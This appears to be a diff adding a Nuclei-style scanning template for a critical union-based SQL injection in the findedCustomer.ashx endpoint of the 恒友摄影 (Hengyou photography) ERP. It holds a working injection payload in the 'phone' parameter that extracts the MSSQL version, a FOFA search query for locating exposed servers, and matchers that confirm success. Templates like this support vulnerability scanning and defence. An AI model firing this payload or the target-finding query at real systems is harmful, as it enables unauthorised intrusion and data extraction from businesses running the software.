@@ -1,0 +1,38 @@
+id: hengyousheying-eap-union-sqli
+
+info:
+  name: hengyousheying-eap findedCustomer.ashx - SQL Injection (Union-based)
+  author: slack
+  severity: critical
+  description: |
+    恒友摄影ERP findedCustomer.ashx SQL。
+  metadata:
+    fofa-query: body="BookChooseDateOrder.html"
+  tags: sqli, idwebsoft, mssql
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ashx/findedCustomer.ashx?Method=InitPage&UserID=20130107155124520&ShopID=F0&name=1&phone=')+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+wzLJ"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "ChildName"
+          - "InsiderID"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: mssql_version
+        part: body
+        group: 1
+        regex:
+          - '"ChildName":"(Microsoft SQL Server [^"]+)"'
